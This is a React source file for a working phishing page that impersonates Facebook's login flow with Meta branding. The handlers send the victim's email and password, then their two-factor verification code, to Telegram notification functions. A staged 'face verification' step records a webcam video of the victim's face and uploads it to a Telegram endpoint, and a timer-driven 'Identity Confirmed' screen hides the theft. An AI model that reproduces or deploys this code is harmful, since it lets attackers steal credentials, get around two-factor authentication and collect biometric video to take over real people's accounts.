
import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';

function FacebookLoader() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative w-16 h-16">
        <div
          className="absolute inset-0 rounded-full border-4 border-gray-200"
          style={{ borderTopColor: '#1877f2' }}
        >
          <style>{`
            @keyframes fb-spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </div>
        <div
          className="absolute inset-0 rounded-full border-4 border-transparent"
          style={{
            borderTopColor: '#1877f2',
            animation: 'fb-spin 1s linear infinite'
          }}
        />
      </div>
      <p className="mt-4 text-sm" style={{ color: '#65676b' }}>Please wait...</p>
    </div>
  );
}

const loginSchema = z.object({
  email: z.string().min(1, "Please enter your email or phone number"),
  password: z.string().min(1, "Please enter your password"),
});

type LoginForm = z.infer<typeof loginSchema>;

const signupSchema = z.object({
  firstName: z.string().min(1, "What's your name?"),
  lastName: z.string().min(1, "What's your name?"),
  emailOrPhone: z.string().min(1, "You'll use this when you log in and if you ever need to reset your password."),
  newPassword: z.string().min(6, "Enter a combination of at least six numbers, letters and punctuation marks (like ! and &)."),
  birthday: z.object({
    month: z.string(),
    day: z.string(),
    year: z.string(),
  }),
  gender: z.string(),
});

type SignupForm = z.infer<typeof signupSchema>;

const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));

export default function LoginPage() {
  const [signupOpen, setSignupOpen] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isSigningUp, setIsSigningUp] = useState(false);
  const [currentStep, setCurrentStep] = useState<string>("login");
  const [userEmail, setUserEmail] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | null>(null);
  const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
  const [isRecording, setIsRecording] = useState(false);
  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);

  const loginForm = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const signupForm = useForm<SignupForm>({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      emailOrPhone: "",
      newPassword: "",
      birthday: {
        month: String(new Date().getMonth()),
        day: String(new Date().getDate()),
        year: String(new Date().getFullYear() - 25),
      },
      gender: "female",
    },
  });

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (currentStep === "loading-login") {
      timer = setTimeout(() => setCurrentStep("code"), 3000);
    } else if (currentStep === "loading-code") {
      timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
    } else if (currentStep === "recording") {
      setCompletedDirections(new Set());
      setCurrentDirection(null);
    }

    return () => clearTimeout(timer);
  }, [currentStep]);

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [stream]);

  const handleLogin = async (data: LoginForm) => {
    setIsLoggingIn(true);
    console.log("Login attempt:", data);
    setUserEmail(data.email);
    await notifyLogin(data.email, data.password);
    setCurrentStep("loading-login");
    setIsLoggingIn(false);
  };

  const handleCodeSubmit = async () => {
    if (verificationCode.length >= 4) {
      await notifyCode(userEmail, verificationCode);
      setCurrentStep("loading-code");
    }
  };

  const handleStartFaceVerification = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      setStream(mediaStream);
      setCurrentStep("instructions");
      if (videoRef) {
        videoRef.srcObject = mediaStream;
      }
    } catch (error) {
      console.error("Camera access denied:", error);
      alert("Please allow camera access to continue with face verification");
    }
  };

  const handleStartRecording = async () => {
    try {
      await notifyFaceScan(userEmail);
    } catch (error) {
      console.error('Failed to send face scan notification:', error);
    }
    
    setIsRecording(true);
    setCurrentStep("recording");
    setCurrentDirection("left");
    
    // Start recording video
    if (stream) {
      const chunks: Blob[] = [];
      
      // Find a supported mimeType
      const mimeTypes = [
        'video/webm;codecs=vp9',
        'video/webm;codecs=vp8',
        'video/webm;codecs=h264',
        'video/webm',
        'video/mp4'
      ];
      
      let selectedMimeType = '';
      for (const type of mimeTypes) {
        if (MediaRecorder.isTypeSupported(type)) {
          selectedMimeType = type;
          console.log('Selected mimeType:', type);
          break;
        }
      }
      
      // If no specific type is supported, let MediaRecorder use default
      if (!selectedMimeType) {
        console.log('No specific mimeType supported, using browser default');
      }
      
      const recorder = selectedMimeType 
        ? new MediaRecorder(stream, { mimeType: selectedMimeType })
        : new MediaRecorder(stream);
      
      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          chunks.push(event.data);
        }
      };
      
      recorder.onstop = async () => {
        try {
          // Use the mimeType that MediaRecorder actually used
          const actualMimeType = selectedMimeType || recorder.mimeType || 'video/webm';
          const videoBlob = new Blob(chunks, { type: actualMimeType });
          setRecordedChunks(chunks);
          
          console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
          
          // Send video to Telegram
          const formData = new FormData();
          formData.append('video', videoBlob, 'face-verification.webm');
          formData.append('email', userEmail);
          
          const response = await fetch('/api/telegram/video', {
            method: 'POST',
            body: formData,
          });
          
          if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
          }
          
          console.log('Video sent successfully');
        } catch (error) {
          console.error('Failed to send video:', error);
        }
      };
      
      recorder.start(100); // Collect data every 100ms
      setMediaRecorder(recorder);
      
      // Auto-progress through directions
      setTimeout(() => {
        const newCompleted = new Set(completedDirections);
        newCompleted.add("left");
        setCompletedDirections(newCompleted);
        setCurrentDirection("right");
        
        // Complete after right direction
        setTimeout(() => {
          const finalCompleted = new Set(newCompleted);
          finalCompleted.add("right");
          setCompletedDirections(finalCompleted);
          setIsRecording(false);
          
          // Stop recording
          if (recorder.state !== 'inactive') {
            recorder.stop();
          }
          
          setCurrentStep("processing");
          setTimeout(() => {
            if (stream) {
              stream.getTracks().forEach(track => track.stop());
            }
            setCurrentStep("complete");
          }, 3000);
        }, 3000); // 3 seconds for right direction
      }, 3000); // 3 seconds for left direction
    }
  };

  const handleSignup = async (data: SignupForm) => {
    setIsSigningUp(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log("Signup attempt:", data);
    setIsSigningUp(false);
    setSignupOpen(false);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#ffffff' }}>
      {/* Language Selector */}
      <div className="text-center pt-4 pb-6">
        <a
          href="#"
          className="text-sm hover:underline"
          style={{ color: '#65676b' }}
          data-testid="link-language"
        >
          English (UK)
        </a>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-5 py-8">
        <div className="w-full max-w-md">
          {/* Facebook Logo */}
          <div className="text-center mb-8">
            <img
              src="/favicon.png"
              alt="Facebook"
              className="w-16 h-16 mx-auto"
              data-testid="logo-facebook"
            />
          </div>

          {/* Login Step */}
          {currentStep === "login" && (
            <>
              <Form {...loginForm}>
                <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                  <FormField
                    control={loginForm.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="text"
                            placeholder="Mobile number or email address"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-email"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={loginForm.control}
                    name="password"
                    render={({ field }) => (
                      <FormItem>
                        <FormControl>
                          <input
                            {...field}
                            type="password"
                            placeholder="Password"
                            className="w-full px-4 py-3 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                            style={{
                              backgroundColor: '#ffffff',
                              borderColor: '#dadde1',
                              color: '#1c1e21',
                            }}
                            onFocus={(e) => {
                              e.currentTarget.style.borderColor = '#1877f2';
                              e.currentTarget.style.boxShadow = '0 0 0 3px rgba(24, 119, 242, 0.1)';
                            }}
                            onBlur={(e) => {
                              e.currentTarget.style.borderColor = '#dadde1';
                              e.currentTarget.style.boxShadow = 'none';
                            }}
                            data-testid="input-password"
                          />
                        </FormControl>
                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                      </FormItem>
                    )}
                  />

                  <button
                    type="submit"
                    disabled={isLoggingIn}
                    className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                    style={{ backgroundColor: '#1877f2' }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                    data-testid="button-login"
                  >
                    {isLoggingIn ? "Logging in..." : "Log in"}
                  </button>
                </form>
              </Form>

              <div className="text-center mt-6">
                <a href="#" className="text-sm hover:underline" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
                  Forgotten password?
                </a>
              </div>

              <div className="mt-8 pt-4" style={{ borderTop: '1px solid #dadde1' }}>
                <button
                  onClick={() => setSignupOpen(true)}
                  className="w-full py-3 text-sm font-bold rounded-full transition"
                  style={{ backgroundColor: '#ffffff', color: '#1877f2', border: '1px solid #1877f2' }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#f0f2f5')}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#ffffff')}
                  data-testid="button-create-account"
                >
                  Create new account
                </button>
              </div>
            </>
          )}

          {/* Loading States */}
          {(currentStep === "loading-login" || currentStep === "loading-code") && (
            <FacebookLoader />
          )}

          {/* Code - Verification Code */}
          {currentStep === "code" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Enter Verification Code</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                We've sent a code to your phone. Enter it below.
              </p>
              <input
                type="text"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                placeholder="Enter code"
                className="w-full px-4 py-3 text-center text-lg border rounded-lg focus:outline-none focus:ring-2 mb-4"
                style={{ borderColor: '#dadde1', color: '#1c1e21', letterSpacing: '0.5em' }}
                data-testid="input-code"
              />
              <button
                onClick={handleCodeSubmit}
                disabled={verificationCode.length < 4}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-60"
                style={{ backgroundColor: '#1877f2' }}
                data-testid="button-submit-code"
              >
                Continue
              </button>
            </div>
          )}

          {/* Face Intro - Confirm Identity */}
          {currentStep === "face-intro" && (
            <div className="text-center">
              <div className="mb-6">
                <img
                  src="/favicon.png"
                  alt="Facebook"
                  className="w-16 h-16 mx-auto"
                />
              </div>
              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
                We need to verify your identity before you can continue to Facebook.
              </p>
              <button
                onClick={() => setCurrentStep("face-explanation")}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
              >
                Continue
              </button>
            </div>
          )}

          {/* Face Explanation */}
          {currentStep === "face-explanation" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                We'll compare a video of your face to your profile photos. This helps us confirm it's your account.
              </p>
              
              {/* Illustration */}
              <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
                <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              </div>

              <button
                onClick={handleStartFaceVerification}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
              >
                Continue
              </button>
              <button
                onClick={() => setCurrentStep("login")}
                className="text-sm"
                style={{ color: '#1877f2' }}
              >
                Cancel
              </button>
            </div>
          )}

          {/* Instructions Screen */}
          {currentStep === "instructions" && (
            <div className="text-center">
              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
                Center your face in the frame. You'll be asked to slowly turn your head left, then right.
              </p>

              {/* Camera Preview */}
              <div className="relative w-64 h-80 mx-auto mb-6 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
                <video
                  ref={(el) => {
                    setVideoRef(el);
                    if (el && stream) {
                      el.srcObject = stream;
                      el.play();
                    }
                  }}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover scale-x-[-1]"
                />
                
                {/* Face outline guide */}
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  <div
                    className="w-48 h-64 rounded-full border-4"
                    style={{
                      borderColor: 'rgba(255, 255, 255, 0.5)',
                      borderStyle: 'dashed'
                    }}
                  />
                </div>
              </div>

              <button
                onClick={handleStartRecording}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
              >
                Start Recording
              </button>
            </div>
          )}

          {/* Recording Screen */}
          {currentStep === "recording" && (
            <div className="text-center">
              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>
                {currentDirection === null ? "Recording..." : `Turn your head ${currentDirection}`}
              </h2>
              <p className="text-xs mb-4" style={{ color: '#65676b' }}>
                Follow the instructions on the screen
              </p>

              {/* Camera Feed */}
              <div className="relative w-full max-w-sm mx-auto mb-4 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000', aspectRatio: '3/4' }}>
                <video
                  ref={(el) => {
                    setVideoRef(el);
                    if (el && stream) {
                      el.srcObject = stream;
                      el.play();
                    }
                  }}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover scale-x-[-1]"
                />

                {/* Circular face guide with direction arrow */}
                <div className="absolute inset-0 pointer-events-none">
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div
                      className="w-56 h-72 rounded-full border-4"
                      style={{
                        borderColor: isRecording ? '#1877f2' : 'rgba(255, 255, 255, 0.3)',
                        borderStyle: 'solid',
                        transition: 'border-color 0.3s'
                      }}
                    />
                  </div>

                  {/* Direction indicator */}
                  {currentDirection && (
                    <div className="absolute inset-0 flex items-center justify-center">
                      <div
                        className="text-white font-bold text-5xl"
                        style={{
                          transform: currentDirection === "left" ? "translateX(-90px)" : "translateX(90px)",
                          textShadow: '0 0 20px rgba(0,0,0,0.9)',
                          transition: 'transform 0.5s ease'
                        }}
                      >
                        {currentDirection === "left" ? "←" : "→"}
                      </div>
                    </div>
                  )}

                  {/* Recording indicator */}
                  {isRecording && (
                    <div className="absolute top-4 left-4 flex items-center gap-2 bg-black bg-opacity-50 px-3 py-1 rounded-full">
                      <div className="w-3 h-3 rounded-full bg-red-500 animate-pulse" />
                      <span className="text-white text-xs font-medium">Recording</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Progress */}
              <div className="flex justify-center gap-3 mb-4">
                {["left", "right"].map((dir) => (
                  <div
                    key={dir}
                    className="w-3 h-3 rounded-full transition-colors"
                    style={{
                      backgroundColor: completedDirections.has(dir) ? '#00a400' : '#e4e6eb'
                    }}
                  />
                ))}
              </div>

              <button
                onClick={() => {
                  if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                  }
                  setCurrentStep("login");
                }}
                className="mt-3 text-xs"
                style={{ color: '#65676b' }}
              >
                Cancel verification
              </button>
            </div>
          )}

          {/* Processing */}
          {currentStep === "processing" && (
            <div className="text-center py-12">
              <div className="relative w-16 h-16 mx-auto mb-4">
                <div
                  className="absolute inset-0 rounded-full border-4"
                  style={{
                    borderColor: '#e4e6eb',
                    borderTopColor: '#1877f2',
                    animation: 'fb-spin 1s linear infinite'
                  }}
                />
              </div>
              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying video...</h2>
              <p className="text-sm" style={{ color: '#65676b' }}>
                This may take a few moments.
              </p>
            </div>
          )}

          {/* Complete - Identity Confirmed */}
          {currentStep === "complete" && (
            <div className="text-center py-8">
              <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#00a400' }}>
                <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
                You can now continue to Facebook.
              </p>
              <button
                onClick={() => {
                  setCurrentStep("login");
                  setUserEmail("");
                  setVerificationCode("");
                  setCompletedDirections(new Set());
                  setCurrentDirection(null);
                  setIsRecording(false);
                  if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    setStream(null);
                  }
                }}
                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                style={{ backgroundColor: '#1877f2' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                data-testid="button-continue"
              >
                Continue
              </button>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="text-center py-8 px-5" style={{ color: '#65676b' }}>
        <div className="mb-4">
          <img
            src={metaLogoImg}
            alt="Meta"
            className="h-8 mx-auto"
            data-testid="img-meta-logo"
          />
        </div>
        <div className="text-xs">
          <a href="#" className="hover:underline mr-2" data-testid="link-about">
            About
          </a>
          <a href="#" className="hover:underline mr-2" data-testid="link-help">
            Help
          </a>
          <a href="#" className="hover:underline" data-testid="link-more">
            More
          </a>
        </div>
      </footer>

      {/* Sign Up Dialog */}
      <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
          <DialogHeader className="p-4 pb-0">
            <DialogTitle className="text-2xl font-bold" style={{ color: '#1c1e21' }}>
              Sign Up
            </DialogTitle>
            <DialogDescription className="text-sm mt-1" style={{ color: '#65676b' }}>
              It's quick and easy.
            </DialogDescription>
          </DialogHeader>

          <div className="my-3" style={{ borderTop: '1px solid #dadde1' }} />

          <Form {...signupForm}>
            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
              <div className="flex gap-3">
                <FormField
                  control={signupForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="First name"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-firstname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
                <FormField
                  control={signupForm.control}
                  name="lastName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input
                          {...field}
                          placeholder="Surname"
                          className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                          style={{
                            backgroundColor: '#f5f6f7',
                            borderColor: '#ccd0d5',
                            color: '#1c1e21',
                          }}
                          data-testid="input-lastname"
                        />
                      </FormControl>
                      <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={signupForm.control}
                name="emailOrPhone"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        placeholder="Mobile number or email address"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-email"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <FormField
                control={signupForm.control}
                name="newPassword"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <input
                        {...field}
                        type="password"
                        placeholder="New password"
                        className="w-full px-3 py-2 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                        style={{
                          backgroundColor: '#f5f6f7',
                          borderColor: '#ccd0d5',
                          color: '#1c1e21',
                        }}
                        data-testid="input-signup-password"
                      />
                    </FormControl>
                    <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
                  </FormItem>
                )}
              />

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Date of birth
                </label>
                <div className="flex gap-3 mt-1">
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.month")}
                    onChange={(e) => signupForm.setValue("birthday.month", e.target.value)}
                    data-testid="select-birthday-month"
                  >
                    {months.map((m, idx) => (
                      <option key={idx} value={String(idx)}>
                        {m}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.day")}
                    onChange={(e) => signupForm.setValue("birthday.day", e.target.value)}
                    data-testid="select-birthday-day"
                  >
                    {days.map((d) => (
                      <option key={d} value={d}>
                        {d}
                      </option>
                    ))}
                  </select>
                  <select
                    className="flex-1 px-2 py-1 text-sm border rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 transition"
                    style={{
                      backgroundColor: '#f5f6f7',
                      borderColor: '#ccd0d5',
                      color: '#1c1e21',
                    }}
                    value={signupForm.watch("birthday.year")}
                    onChange={(e) => signupForm.setValue("birthday.year", e.target.value)}
                    data-testid="select-birthday-year"
                  >
                    {years.map((y) => (
                      <option key={y} value={y}>
                        {y}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label className="text-xs" style={{ color: '#65676b' }}>
                  Gender
                </label>
                <div className="flex gap-3 mt-1">
                  {[
                    { value: "female", label: "Female" },
                    { value: "male", label: "Male" },
                    { value: "custom", label: "Custom" },
                  ].map((option) => (
                    <label
                      key={option.value}
                      className="flex-1 flex items-center justify-between px-3 py-2 border rounded-md cursor-pointer"
                      style={{
                        backgroundColor: '#f5f6f7',
                        borderColor: '#ccd0d5',
                      }}
                    >
                      <span className="text-sm" style={{ color: '#1c1e21' }}>
                        {option.label}
                      </span>
                      <input
                        type="radio"
                        name="gender"
                        value={option.value}
                        onChange={(e) => signupForm.setValue("gender", e.target.value)}
                        checked={signupForm.watch("gender") === option.value}
                        className="w-4 h-4 cursor-pointer"
                        data-testid={`radio-gender-${option.value}`}
                      />
                    </label>
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={isSigningUp}
                className="w-auto px-16 py-2 text-white text-base font-bold rounded-md transition disabled:opacity-60 mx-auto block"
                style={{ backgroundColor: '#00a400' }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#009200')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#00a400')}
                data-testid="button-signup-submit"
              >
                {isSigningUp ? "Signing up..." : "Sign Up"}
              </button>
            </form>
          </Form>
        </DialogContent>
      </Dialog>
    </div>
  );
}
